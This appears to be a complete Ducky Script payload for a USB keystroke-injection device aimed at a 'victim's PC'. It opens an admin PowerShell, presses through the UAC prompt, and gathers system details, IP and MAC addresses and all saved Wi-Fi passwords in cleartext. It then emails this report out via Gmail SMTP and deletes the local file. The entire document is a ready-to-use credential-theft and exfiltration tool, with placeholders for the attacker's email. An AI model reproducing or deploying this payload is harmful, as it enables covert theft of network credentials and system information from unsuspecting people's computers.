REM		-- This would be the beginning of the script. 2 second delay to allow USB to enumerate in victim's PC.
DELAY 2000
REM		-- Press Win + R to open 'Run'.
GUI R
DELAY 100
REM		-- Start Powershell as administrator (alternatively you can substitute 'CMD' if you prefer).
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 300
REM		-- Press 'ALT + Y' to choose 'Yes' option for UAC dialog box.
ALT y
DELAY 300
REM		-- To account for any victim with UAC disabled, cursor will shift left once and press 'DELETE' to remove lowercase 'y' from the shell.
REM		-- Any victim with UAC enabled, pressing LEFTARROW + DELETE effectively does nothing, which allows us to account for both scenarios.
LEFTARROW
DELETE

STRING $computerSystem = Get-CimInstance CIM_ComputerSystem
SHIFT ENTER
STRING $computerBIOS = Get-CimInstance CIM_BIOSElement
SHIFT ENTER
STRING $computerOS = Get-CimInstance CIM_OperatingSystem
SHIFT ENTER
STRING $computerCPU = Get-CimInstance CIM_Processor
SHIFT ENTER
STRING $computerHDD = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"
SHIFT ENTER
STRING $computerPubIP = irm ipinfo.io/ip
SHIFT ENTER
STRING $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
SHIFT ENTER
STRING $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
SHIFT ENTER
STRING foreach ($Network in $Networks) {
SHIFT ENTER
STRING $IsDHCPEnabled = $false
SHIFT ENTER
STRING If($network.DHCPEnabled) {
SHIFT ENTER
STRING $IsDHCPEnabled = $true
SHIFT ENTER
STRING   }
SHIFT ENTER
STRING [string[]]$computerMAC =$Network.MACAddress
SHIFT ENTER
STRING }
SHIFT ENTER
STRING $output = netsh.exe wlan show profiles
SHIFT ENTER
STRING $profileRows = $output | Select-String -Pattern 'All User Profile'
SHIFT ENTER
STRING $profileNames = New-Object System.Collections.ArrayList
SHIFT ENTER
STRING for($i = 0; $i -lt $profileRows.Count; $i++){
SHIFT ENTER
STRING $profileName = ($profileRows[$i] -split ":")[-1].Trim()
SHIFT ENTER   
STRING $profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear
SHIFT ENTER   
STRING $SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
SHIFT ENTER
STRING $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'
SHIFT ENTER 
STRING $passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
SHIFT ENTER
STRING if($passwordSearchResult){
SHIFT ENTER
STRING $profilePw = ($passwordSearchResult -split ":")[-1].Trim()
SHIFT ENTER
STRING } else {
SHIFT ENTER
STRING $profilePw = ''
SHIFT ENTER
STRING }
SHIFT ENTER   
STRING $networkObject = New-Object -TypeName psobject -Property @{
SHIFT ENTER
STRING ProfileName = $profileName
SHIFT ENTER
STRING SSID = $profileSSID
SHIFT ENTER
STRING Password = $profilePw
SHIFT ENTER
STRING }
SHIFT ENTER
STRING $profileNames.Add($networkObject)
SHIFT ENTER
STRING }
SHIFT ENTER
STRING Clear-Host
SHIFT ENTER
STRING $(
SHIFT ENTER
STRING Write-Host "System Information for: " $computerSystem.Name -BackgroundColor DarkCyan
SHIFT ENTER
STRING "Manufacturer: " + $computerSystem.Manufacturer
SHIFT ENTER
STRING "Model: " + $computerSystem.Model
SHIFT ENTER
STRING "Serial Number: " + $computerBIOS.SerialNumber
SHIFT ENTER
STRING "CPU: " + $computerCPU.Name
SHIFT ENTER
STRING "HDD Capacity: "  + "{0:N2}" -f ($computerHDD.Size/1GB) + "GB"
SHIFT ENTER
STRING "HDD Space: " + "{0:P2}" -f ($computerHDD.FreeSpace/$computerHDD.Size) + " Free (" + "{0:N2}" -f ($computerHDD.FreeSpace/1GB) + "GB)"
SHIFT ENTER
STRING "RAM: " + "{0:N2}" -f ($computerSystem.TotalPhysicalMemory/1GB) + "GB"
SHIFT ENTER
STRING "Operating System: " + $computerOS.caption + ", Service Pack: " + $computerOS.ServicePackMajorVersion
SHIFT ENTER
STRING "User logged In: " + $computerSystem.UserName
SHIFT ENTER
STRING "Last Reboot: " + $computerOS.LastBootUpTime
SHIFT ENTER
STRING "Computers MAC adress: " + $computerMAC
SHIFT ENTER
STRING "Computers IP adress: " + $computerIP.ipaddress[0]
SHIFT ENTER
STRING "Public IP adress: " + $computerPubIP
SHIFT ENTER
STRING $profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password
SHIFT ENTER
) *>&1 > i.txt
SHIFT ENTER
ENTER
DELAY 2000
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER

REM		-- Remember to add your email details for the script to work. change Email, PASSWORD, SENDERMAIL and RECIVERMAIL.

STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'SENDEREMAIL'
ENTER
STRING $ReportEmail.To.Add('RECIVEREMAIL')
ENTER
STRING $ReportEmail.Subject = 'Info file'
ENTER
STRING $ReportEmail.Body = (Get-Content i.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 2000
STRING del i.txt
ENTER
DELAY 500
STRING exit
ENTER
